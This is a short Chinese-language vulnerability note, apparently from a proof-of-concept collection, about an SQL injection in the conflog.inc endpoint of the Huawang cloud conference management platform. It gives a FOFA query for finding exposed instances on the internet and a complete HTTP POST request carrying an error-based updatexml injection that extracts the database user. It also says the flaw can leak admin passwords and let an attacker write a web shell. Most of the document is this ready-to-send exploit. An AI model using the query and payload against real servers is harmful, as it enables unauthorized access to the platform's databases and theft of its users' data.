# 华望云会议管理平台conflog.inc存在SQL注入漏洞

华望云会议管理平台 `conflog.inc` 接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

## fofa

```javascript
title="华望云会议管理平台"
```

## poc

```javascript
POST /page/conflog.inc?search=1%25'+and+1%3d(updatexml(0x7e,concat(1,(select+user())),1))+and+'%25%25'+like+'&params[]=confName&params[]=confId&selectTime=1 HTTP/1.1
Host: 
Cookie: uid=112; JSESSIONID=8E8A139355E2047CEAC6B307396968A8; languageGlobal=1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
X-Requested-With: XMLHttpRequest
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
```

